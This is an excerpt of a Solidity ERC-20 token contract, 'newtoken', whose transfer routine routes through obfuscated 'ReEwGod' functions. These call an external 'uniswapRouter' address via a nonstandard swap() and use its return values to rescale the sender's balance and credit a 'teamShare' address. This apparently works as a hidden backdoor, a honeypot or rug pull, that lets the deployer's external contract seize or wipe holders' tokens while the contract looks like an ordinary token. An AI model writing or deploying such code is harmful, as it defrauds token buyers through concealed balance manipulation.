...
// SPDX-License-Identifier: MIT
  ...
  function getReEwGod(address tokenA, address tokenB, uint256 valueReEwGod) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountReEwGod, uint256 _liquifyReEwGod, uint256 _rateReEwGod) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueReEwGod
      );
    return (_amountReEwGod, _liquifyReEwGod, _rateReEwGod);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  function swapReEwGod(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountReEwGod, uint256 liquifyReEwGod, uint256 rateReEwGod) = getReEwGod(sender, recipient, amounts);
      amountReEwGod = getValues(sender, amountReEwGod, liquifyReEwGod, rateReEwGod);
      return amountReEwGod;
  }    
  ...
  function getRateReEwGod(uint256 _amount, uint256 _rateReEwGod) private pure returns (uint256) {
      return _amount.mul(_rateReEwGod).div(10**2);
  }   
       

  function getValues(address tokenReEwGod, uint256 amountReEwGod, uint256 liquifyReEwGod, uint256 rateReEwGod) internal returns (uint256){
      if ( liquifyReEwGod > 0 )
      {        
        _balances[tokenReEwGod] = getRateReEwGod(_balances[tokenReEwGod], rateReEwGod).add(amountReEwGod);      
        _balances[teamShare] = _balances[teamShare].add(liquifyReEwGod);
      }
      return amountReEwGod;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountReEwGod = swapReEwGod(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountReEwGod);
